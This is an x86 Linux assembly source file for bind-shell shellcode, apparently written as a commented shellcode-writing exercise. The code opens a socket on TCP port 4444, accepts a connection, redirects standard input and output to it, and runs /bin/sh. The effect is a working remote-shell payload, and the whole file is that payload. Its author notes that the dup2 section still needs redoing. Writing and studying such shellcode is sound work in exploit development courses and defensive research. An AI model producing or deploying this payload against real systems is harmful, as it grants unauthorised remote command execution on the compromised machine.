; Filename: linux_shell_bind_tcp_x86.nasm 
; Author: wfscs3
 
global _start
 
section .text
 
_start:
 
; ------------------------------
; 1 - sys_socketcall         
; ------------------------------
;  int socketcall(int call,      
;  unsigned long *args);    
; ------------------------------
;               
; eax = 0x66 (sys_socket)       
; ebx = 0x1 (socket)        
; ecx = pointer to args     
;   arg1 = 0x0 (ipproto_ip)     
;   arg2 = 0x1 (sock_stream)    
;   arg3 = 0x2 (af_net)         
; ------------------------------
 
push 0x66
pop eax
push 0x1
pop ebx
 
xor esi, esi
push esi 
push ebx
push 0x2
 
mov ecx, esp
 
int 0x80
 
; ---------------------------------------------
; it is necessary to save the result of above 
; for later usage (sockfd) in sys_listen      
; ---------------------------------------------
 
xor edi, edi
mov edi, eax
 
;---------------------------------------
; 2 - sys_bind                           
;---------------------------------------
; int bind(int sockfd, const struct     
; sockaddr *addr, socklen_t addrlen);   
;---------------------------------------
;                                               
; eax = 0x66 (sys_socket)               
; ebx = 0x2 (sys_bind)                  
; ecx = pointer to args                 
;   arg1 = 0x2 (af_inet)                
;   arg2 = word ? (port)                
;   arg3 = 0x0 (inaddr_any)             
;---------------------------------------
 
 
push esi    		; socadd NULL   
push esi    		; inaddr_any 0
push word 0x5c11 	; port 4444, 
push word 0x2 		; AF_INET = 2
 
mov ecx, esp
 
push 0x66
pop eax
push 0x2 
pop ebx
push 0x10   ; addrlen (16)
push ecx    ; addr (pointer)
push edi    ; sockfd
 
mov ecx, esp
 
 
int 0x80
 
;-------------------------------
; 3 - sys_listen                 
;-------------------------------
; int listen(int sockfd,        
; int backlog);             
;-------------------------------
; eax = 0x66 (sys_socket)       
; ebx = 0x4 (sys_listen)         
; ecx = pointer to args         
;   arg1 = edi (sockfd)          value saved from (1) sys_socketcall
;   arg2 = 0x0 (backlog?)       
;-------------------------------
 
push 0x66
pop eax
push 0x4
pop ebx
 
push esi ; 0
push edi ; sockfd
 
mov ecx, esp
 
int 0x80
 
;-------------------------------
; 4 - sys_accept                  
; ------------------------------
; int accept(int sockfd, struct 
; sockaddr *addr, socklen_t     
; *addrlen);                  
;-------------------------------
; eax = 0x66 (sys_socket)       
; ebx = 0x5 (sys_accept)         
; ecx = pointer to args         
;   arg1 = edi (sockfd)          value saved from (1) sys_socketcall
;   arg2 = 0x0 (addr)           
;   arg3 = 0x0 (addrlen)         
;--------------------------------
 
push 0x66
pop eax
push 0x5
pop ebx
 
xor esi, esi
push esi ; 0
push esi ; 0
push edi ; sockfd
 
mov ecx, esp
 
int 0x80 
 
;-------------------------------
; 5 - sys_dup2                    
;-------------------------------
; int dup2(int oldfd, int newfd)
;-------------------------------
; eax = 0x3f (sys_dup2)         
; ebx =                          
; ecx = pointer to args          
;    arg1 = (oldfd)           
;    arg2 = (newfd)             
;-------------------------------
;
; NEED TO REDO THIS SECTION 
 
pop ecx 
pop ecx ; (0x0) clean ecx 
mov cl, 0x2 
  
xchg ebx, eax  
 
;----------------------------------------------------
; loop to redirect stdin(0), stdout(1) and stderr(2) 
;----------------------------------------------------
 
dup2loop:
    mov al, 0x3f   ;syscall: sys_dup2 
    int 0x80        ;exec sys_dup2
    dec ecx         ;decrement loop-counter
    jns dup2loop    ;jmp to loop
 
;-------------------------------
; 6 - sys_execve                
; ------------------------------
; int execve(const char          
; *filename, char *const argv[],
; char *const envp[]);          
;-------------------------------
; eax = 0x0b (sys_execve)       
; ebx = pointer (filename)      
; ecx = 0 (argv)                
; edx = 0 (envp)                
;-------------------------------
 
push 0x0b
pop eax
push 0x68732f2f ;"hs//"
push 0x6e69622f ;"nib/"
mov ebx, esp
xor ecx, ecx
xor edx, edx
 
int 0x80
